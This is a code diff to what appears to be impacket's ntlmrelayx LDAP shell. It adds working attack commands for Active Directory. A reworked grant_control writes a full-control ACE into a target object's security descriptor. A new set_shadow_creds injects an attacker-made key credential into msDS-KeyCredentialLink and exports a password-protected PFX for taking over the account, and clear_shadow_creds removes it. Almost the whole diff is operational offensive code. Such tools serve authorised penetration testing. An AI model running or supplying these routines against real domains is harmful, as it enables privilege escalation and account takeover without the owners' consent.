@@ -28,6 +28,8 @@ from impacket import LOG
 from ldap3.protocol.microsoft import security_descriptor_control
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.ldap import ldaptypes
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
+import uuid
 
 
 class LdapShell(cmd.Cmd):
@@ -506,51 +508,53 @@ class LdapShell(cmd.Cmd):
 
     def do_grant_control(self, line):
         args = shlex.split(line)
+        if len(args) == 2:
+            target_spec, grantee_name = args
+            target_base = self.domain_dumper.root
+        elif len(args) == 3:
+            target_base, target_spec, grantee_name = args
+        else:
+            raise Exception(f'Expecting target and grantee or search base, target and grantee. Received {len(args)} arguments instead.')
 
-        if len(args) != 1 and len(args) != 2:
-            raise Exception("Error expecting target and grantee names for RBCD attack. Recieved %d arguments instead." % len(args))
+        if target_spec.startswith('(') and target_spec.endswith(')'):
+            target_filter = target_spec
+        else:
+            target_filter = f'(sAMAccountName={escape_filter_chars(target_spec)})'
 
         controls = security_descriptor_control(sdflags=0x04)
 
-        target_name = args[0]
-        grantee_name = args[1]
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})', attributes=['objectSid'], controls=controls)
+        if not self.client.entries:
+            raise Exception('Grantee not found')
+        if len(self.client.entries) > 1:
+            raise Exception('Grantee not unique')
+        grantee_sid = self.client.entries[0]['objectSid'].value
+        print(f'Resolved {grantee_name!r} to {grantee_sid!r}')
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
-        if success is False or len(self.client.entries) != 1:
-            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
-
-        target = self.client.entries[0]
-        target_sid = target["objectSid"].value
-        print("Found Target DN: %s" % target.entry_dn)
-        print("Target SID: %s\n" % target_sid)
-
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
-        if success is False or len(self.client.entries) != 1:
-            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
-
-        grantee = self.client.entries[0]
-        grantee_sid = grantee["objectSid"].value
-        print("Found Grantee DN: %s" % grantee.entry_dn)
-        print("Grantee SID: %s" % grantee_sid)
+        self.client.search(target_base, target_filter, attributes=['nTSecurityDescriptor'], controls=controls)
+        if not self.client.entries:
+            raise Exception('Target not found')
+        if len(self.client.entries) > 1:
+            raise Exception('Target not unique')
+        target_entry = self.client.entries[0]
+        print(f'Resolved {target_filter!r} to {target_entry.entry_dn!r}')
 
         try:
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_entry['nTSecurityDescriptor'].raw_values[0])
         except IndexError:
             sd = self.create_empty_sd()
-
         sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
-        self.client.modify(target.entry_dn, {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
 
+        self.client.modify(target_entry.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]}, controls=controls)
         if self.client.result['result'] == 0:
             print('DACL modified successfully!')
-            print('%s now has control of %s' % (grantee_name, target_name))
+            print(f'{grantee_name!r} now has control of {target_entry.entry_dn!r}')
+        elif self.client.result['result'] == 50:
+            raise Exception(f'Could not modify object, the server reports insufficient rights: {self.client.result["message"]}')
+        elif self.client.result['result'] == 19:
+            raise Exception(f'Could not modify object, the server reports a constrained violation: {self.client.result["message"]}')
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
-            else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+            raise Exception(f'The server returned an error: {self.client.result["message"]}')
 
     def do_set_rbcd(self, line):
         args = shlex.split(line)
@@ -601,6 +605,70 @@ class LdapShell(cmd.Cmd):
         if self.client.result['result'] == 0:
             print('Delegation rights modified successfully!')
             print('%s can now impersonate users on %s via S4U2Proxy' % (grantee_name, target_name))
+        else:
+            if self.client.result['result'] == 50:
+                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                raise Exception('The server returned an error: %s', self.client.result['message'])
+
+    def do_set_shadow_creds(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 1:
+            raise Exception("Error expecting target name for shadow credentials attack. Recieved %d arguments instead." % len(args))
+
+        target_name = args[0]
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'msDS-KeyCredentialLink'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectSid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name)
+        device_id = shadow_credentials.getDeviceId()
+        keyCredential = shadow_credentials.KeyCredential(key, deviceId=device_id, currentTime=shadow_credentials.getTicksNow())
+        print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
+
+        try:
+            new_values = target['msDS-KeyCredentialLink'].raw_values + [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
+            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            print("Shadow credentials successfully added!")
+            if self.client.result['result'] == 0:
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                shadow_credentials.exportPFX(certificate, key, password=password, path_to_file=path)
+                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                print("Must be used with password: %s" % password)
+            else:
+                if self.client.result['result'] == 50:
+                    print('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+                elif self.client.result['result'] == 19:
+                    print('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+                else:
+                    print('The server returned an error: %s' % self.client.result['message'])
+        except IndexError as e:
+            print('Attribute msDS-KeyCredentialLink does not exist')
+        return
+
+    def do_clear_shadow_creds(self, target):
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['objectSid', 'msDS-KeyCredentialLink'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectsid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink':[ldap3.MODIFY_REPLACE, []]})
+        if self.client.result['result'] == 0:
+            print('Shadow credentials cleared successfully!')
         else:
             if self.client.result['result'] == 50:
                 raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
@@ -667,6 +735,7 @@ class LdapShell(cmd.Cmd):
  add_user_to_group user group - Adds a user to a group.
  change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
  clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).
  disable_account user - Disable the user's account.
  enable_account user - Enable the user's account.
  dump - Dumps the domain.
@@ -674,9 +743,10 @@ class LdapShell(cmd.Cmd):
  get_user_groups user - Retrieves all groups this user is a member of.
  get_group_users group - Retrieves all members of a group.
  get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
- grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+ grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter, optional search base) to the grantee (sAMAccountName).
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
  start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
  whoami - get connected user
